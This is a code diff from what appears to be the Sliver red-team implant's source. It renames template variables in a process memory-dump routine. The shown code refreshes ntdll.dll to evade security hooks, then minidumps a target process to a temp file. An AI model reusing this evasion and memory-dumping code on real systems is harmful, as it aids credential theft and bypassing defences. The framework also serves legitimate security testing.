@@ -22,12 +22,12 @@ import (
 	"fmt"
 	"io/ioutil"
 
-	//{{if .Debug}}
+	//{{if .Config.Debug}}
 	"log"
 	//{{end}}
 
-	// {{if .Evasion}}
-	// {{if eq .GOARCH "amd64"}}
+	// {{if .Config.Evasion}}
+	// {{if eq .Config.GOARCH "amd64"}}
 	"github.com/bishopfox/sliver/sliver/evasion"
 	// {{end}}
 	// {{end}}
@@ -68,12 +68,12 @@ func dumpProcess(pid int32) (ProcessDump, error) {
 
 func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 	dump := &WindowsDump{}
-	// {{if eq .GOARCH "amd64"}}
+	// {{if eq .Config.GOARCH "amd64"}}
 	// Hotfix for #66 - need to dig deeper
-	// {{if .Evasion}}
+	// {{if .Config.Evasion}}
 	err := evasion.RefreshPE(`c:\windows\system32\ntdll.dll`)
 	if err != nil {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Println("RefreshPE failed:", err)
 		//{{end}}
 		return dump, err
@@ -83,7 +83,7 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 	// TODO: find a better place to store the dump file
 	f, err := ioutil.TempFile("", "")
 	if err != nil {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Println("Failed to create temp file:", err)
 		//{{end}}
 		return dump, err
@@ -98,14 +98,14 @@ func minidump(pid uint32, proc windows.Handle) (ProcessDump, error) {
 		data, err := ioutil.ReadFile(f.Name())
 		dump.data = data
 		if err != nil {
-			//{{if .Debug}}
+			//{{if .Config.Debug}}
 			log.Println("ReadFile failed:", err)
 			//{{end}}
 			return dump, err
 		}
 		os.Remove(f.Name())
 	} else {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Println("Minidump syscall failed:", err)
 		//{{end}}
 		return dump, err
